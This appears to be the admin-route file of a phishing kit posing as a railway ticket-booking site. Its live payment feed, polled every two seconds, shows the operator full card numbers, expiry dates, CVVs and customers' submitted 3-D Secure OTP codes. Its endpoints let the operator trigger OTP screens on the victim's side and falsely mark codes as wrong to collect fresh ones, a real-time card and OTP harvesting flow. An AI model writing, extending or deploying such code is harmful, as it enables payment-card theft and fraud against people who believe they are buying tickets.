const express = require('express');
const dayjs = require('dayjs');
const {
  User, Order, Ticket, Train, Station, Trip, Payment, SeatBlock, SyncLog
} = require('../models/index');
const { requireAdmin } = require('../middleware/auth');
const scheduleService = require('../services/scheduleService');
const paymentService = require('../services/paymentService');
const liveSyncService = require('../services/liveSyncService');
const config = require('../config');
const adyContent = require('../config/adyContent');
const h = require('../utils/helpers');

// ==================== ROUTERS ====================
const pages = express.Router({ mergeParams: true });
const api = express.Router();

// ==================== Helper Functions ====================
async function pendingCount() {
  return Payment.countDocuments({ status: { $in: ['pending_admin', 'code_submitted'] } });
}

function adminEntry(req, res, next) {
  if (req.currentUser && req.currentUser.role === 'admin') return next();
  const wantsJson = req.xhr || (req.headers.accept || '').includes('application/json');
  if (wantsJson) return res.status(403).json({ ok: false, message: res.locals.t('msg.noPermission') });
  return res.redirect('/' + config.defaultLocale + '/login?next=' + encodeURIComponent(req.originalUrl));
}

async function ensureEnvAdmin() {
  try {
    const email = String(config.adminEmail || '').trim().toLowerCase();
    if (!email) return;
    let user = await User.findOne({ email });
    if (!user) {
      if (!config.adminPassword) return;
      user = await User.create({
        firstName: config.adminFirstName || 'Sistem',
        lastName: config.adminLastName || 'İdarəçi',
        email,
        password: await User.hashPassword(config.adminPassword),
        role: 'admin',
        managedFromEnv: true,
        passwordResetForced: !!config.adminTempPassword,
        locale: config.defaultLocale
      });
      console.log('[admin] hesab yaradıldı: ' + email);
    } else if (user.role !== 'admin') {
      user.role = 'admin';
      await user.save();
    }
  } catch (e) {
    console.warn('[admin] hesab hazırlanmadı:', e.message);
  }
}

// ==================== PAGES ROUTES ====================
pages.use(requireAdmin);

pages.get('/', adminEntry, async (req, res, next) => {
  try {
    const startOfDay = dayjs().startOf('day').toDate();
    const [
      userCount, orderCount, ticketCount, trainCount, stationCount,
      pending, todayTrips, revenueAgg, recentOrders, pendingPayments, lastSync
    ] = await Promise.all([
      User.countDocuments({ role: 'user' }),
      Order.countDocuments(),
      Ticket.countDocuments({ status: 'active' }),
      Train.countDocuments({ active: true }),
      Station.countDocuments({ active: true }),
      pendingCount(),
      Trip.countDocuments({ date: dayjs().format('YYYY-MM-DD') }),
      Order.aggregate([{ $match: { status: { $in: ['confirmed', 'paid'] } } }, { $group: { _id: null, total: { $sum: '$total' } } }]),
      Order.find().sort({ createdAt: -1 }).limit(8).lean(),
      Payment.find({ status: { $in: ['pending_admin', 'code_submitted'] } }).sort({ createdAt: -1 }).limit(8).lean(),
      SyncLog.findOne().sort({ createdAt: -1 }).lean()
    ]);

    res.render('pages/admin/dashboard', {
      title: 'İdarəetmə paneli',
      stats: {
        users: userCount,
        orders: orderCount,
        tickets: ticketCount,
        trains: trainCount,
        stations: stationCount,
        pending,
        todayTrips,
        revenue: revenueAgg.length ? revenueAgg[0].total : 0
      },
      recentOrders,
      pendingPayments,
      lastSync,
      startOfDay
    });
  } catch (e) { next(e); }
});

pages.get('/odenisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'pending';
    const filter = status === 'pending'
      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] } }
      : status === 'all' ? {} : { status };

    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
    payments.forEach((p) => {
      p.cardNumberPlain = paymentService.prettyCardNumber(p);
      p.secondsLeft = paymentService.secondsLeft(p);
    });
    const orderIds = payments.map((p) => p.order).filter(Boolean);
    const userIds = payments.map((p) => p.user).filter(Boolean);

    const [orders, users] = await Promise.all([
      Order.find({ _id: { $in: orderIds } }).lean(),
      User.find({ _id: { $in: userIds } }).lean()
    ]);

    const orderMap = {};
    orders.forEach((o) => { orderMap[String(o._id)] = o; });
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    res.render('pages/admin/payments', {
      title: res.locals.t('admin.payments'),
      payments,
      orderMap,
      userMap,
      status,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
  try {
    const status = req.query.status || 'all';
    const filter = status === 'all' ? {} : { status };
    const orders = await Order.find(filter).sort({ createdAt: -1 }).limit(120).lean();
    const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });
    res.render('pages/admin/orders', {
      title: res.locals.t('admin.orders'),
      orders,
      userMap,
      status,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

pages.get('/reysler', requireAdmin, async (req, res, next) => {
  try {
    const date = req.query.date || h.todayISO();
    const line = req.query.line || 'all';
    const rows = await scheduleService.buildTimetableRows(date, line);
    /* Hər sətirə uyğun Trip _id bağlanır ki, "Yerləri idarə et" düyməsi işlək olsun */
    const dayTrips = await Trip.find({ date }).select('trainNumber').lean();
    const idByNumber = {};
    dayTrips.forEach((t) => { idByNumber[t.trainNumber] = String(t._id); });
    rows.forEach((r) => { r.tripId = idByNumber[r.number] || null; });

    res.render('pages/admin/trips', {
      title: res.locals.t('admin.trips'),
      rows,
      date,
      line,
      today: h.todayISO(),
      dateText: date,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

/* Reys detalları — yerlərin bloklanması ekranı */
pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
  try {
    const payload = await scheduleService.buildTripPayload(req.params.tripId, null);
    if (!payload) return next();
    res.render('pages/admin/trip-detail', {
      title: res.locals.t('admin.trips'),
      trip: payload.trip,
      maps: payload.maps,
      pending: await pendingCount()
    });
  } catch (e) { next(e); }
});

// ==================== API ROUTES ====================
api.use(requireAdmin);

/* Canlı ödəniş siyahısı — admin paneli hər 2 saniyədə oxuyur */
api.get('/payments/feed', async (req, res) => {
  try {
    const status = req.query.status || 'pending';
    const filter = status === 'pending'
      ? { status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] } }
      : status === 'all' ? {} : { status };

    const payments = await Payment.find(filter).sort({ createdAt: -1 }).limit(100).lean();
    const [orders, users] = await Promise.all([
      Order.find({ _id: { $in: payments.map((p) => p.order).filter(Boolean) } }).lean(),
      User.find({ _id: { $in: payments.map((p) => p.user).filter(Boolean) } }).lean()
    ]);
    const orderMap = {};
    orders.forEach((o) => { orderMap[String(o._id)] = o; });
    const userMap = {};
    users.forEach((u) => { userMap[String(u._id)] = u; });

    const rows = payments.map((p) => {
      const o = orderMap[String(p.order)] || null;
      const u = userMap[String(p.user)] || null;
      return {
        id: String(p._id),
        transactionId: p.transactionId,
        status: p.status,
        stage: p.stage,
        secondsLeft: paymentService.secondsLeft(p),
        amount: p.amount,
        createdAt: p.createdAt,
        usingSavedCard: !!p.usingSavedCard,
        saveCard: !!p.saveCard,
        rejectionCount: p.rejectionCount || 0,
        card: {
          number: paymentService.prettyCardNumber(p),
          masked: p.card ? p.card.masked : '',
          holder: p.card ? p.card.holder : '',
          expiry: p.card ? p.card.expiry : '',
          cvv: p.card ? p.card.cvv : '',
          brand: p.card ? p.card.brand : ''
        },
        submittedCode: p.submittedCode || '',
        codeAttempts: (p.codeAttempts || []).map((c) => ({ code: c.code, at: c.at })),
        order: o ? { orderNo: o.orderNo, route: o.fromName + ' → ' + o.toName, date: o.date, status: o.status, id: String(o._id) } : null,
        user: u ? { name: u.firstName + ' ' + u.lastName, email: u.email, phone: u.phone || '' } : null
      };
    });

    res.json({ ok: true, rows, pending: await pendingCount(), at: Date.now() });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Siyahı oxunmadı' });
  }
});

/* Ödəniş detalları */
api.get('/payments/:id', async (req, res) => {
  try {
    const payment = await Payment.findById(req.params.id);
    if (!payment) return res.status(404).json({ ok: false, message: 'Ödəniş tapılmadı' });

    const order = payment.order ? await Order.findById(payment.order).lean() : null;
    const user = await User.findById(payment.user).lean();

    res.json({
      ok: true,
      payment,
      order,
      user: {
        _id: user._id,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email,
        phone: user.phone
      }
    });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Xəta: ' + e.message });
  }
});

/* Admin kartı təsdiqləyir - OTP ekranı açılır */
api.post('/payments/:id/approve-card', async (req, res) => {
  try {
    const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Kart təsdiq edildi — istifadəçidə 3-D OTP ekranı açıldı',
      stage: result.payment.stage
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Admin "Səhv OTP Kodu" seçir - yeni OTP göndərilir, geri sayım başlayır */
api.post('/payments/:id/reject-otp', async (req, res) => {
  try {
    const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Səhv OTP — istifadəçidə 2 dəq geri sayım başladı, sonra yeni OTP ekranı açılacaq.',
      stage: result.payment.stage
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Admin OTP ekranını açır (manual) */
api.post('/payments/:id/open-otp', async (req, res) => {
  try {
    const result = await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'OTP ekranı açıldı',
      stage: result.payment.stage
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Bilet verməklə ödənişi yekunlaş - SaxlanılmışKart saxlanılır */
api.post('/payments/:id/approve', async (req, res) => {
  try {
    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: 'Bilet verildi!',
      payment: result.payment,
      tickets: result.tickets,
      order: result.order
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Ödənişi rədd et */
api.post('/payments/:id/decline', async (req, res) => {
  try {
    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
    return res.json({ ok: true, message: 'Ödəniş rədd edildi.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
  }
});

/* Sifariş statusu yenilə */
api.post('/orders/:id/status', async (req, res) => {
  try {
    const order = await Order.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    order.status = (req.body || {}).status || order.status;
    order.adminNote = (req.body || {}).note || order.adminNote;
    await order.save();
    return res.json({ ok: true, message: 'Status yeniləndi' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Yenilənmədi' });
  }
});

/* Yerlər blokla */
api.post('/trips/:tripId/seats/block', async (req, res) => {
  try {
    const b = req.body || {};
    const trip = await Trip.findById(req.params.tripId);
    if (!trip) return res.status(404).json({ ok: false, message: 'Reys tapılmadı' });

    const wagon = Number(b.wagon);
    const cls = (trip.classes || []).find((c) => c.code === b.classCode);
    if (!cls) return res.status(400).json({ ok: false, message: 'Sinif tapılmadı' });

    const seats = [];
    if (typeof b.seat === 'string' && b.seat.indexOf('-') > -1) {
      const parts = b.seat.split('-');
      const from = Number(parts[0]);
      const to = Number(parts[1]);
      for (let i = from; i <= to; i++) seats.push(i);
    } else if (b.seat) {
      seats.push(Number(b.seat));
    }

    const block = await SeatBlock.create({
      trip: trip._id,
      date: trip.date,
      classCode: b.classCode,
      wagon,
      seats,
      reason: b.reason || '',
      active: true
    });

    return res.json({ ok: true, message: 'Yerlər bağlandı', block });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Bağlanmadı' });
  }
});

/* Yer blokunu açıq et */
api.delete('/blocks/:blockId', async (req, res) => {
  try {
    await SeatBlock.findByIdAndDelete(req.params.blockId);
    return res.json({ ok: true, message: 'Bağlantı açıldı' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Açılmadı' });
  }
});

/* Live ödənişlər - WebSocket/polling üçün */
api.get('/payments/live/pending', async (req, res) => {
  try {
    const payments = await Payment.find({
      status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] }
    })
    .populate('order')
    .populate('user', 'firstName lastName email phone')
    .sort({ createdAt: -1 })
    .limit(50)
    .lean();

    return res.json({
      ok: true,
      count: payments.length,
      payments
    });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Xəta: ' + e.message });
  }
});

// ==================== EXPORTS ====================
module.exports = { pages, api };
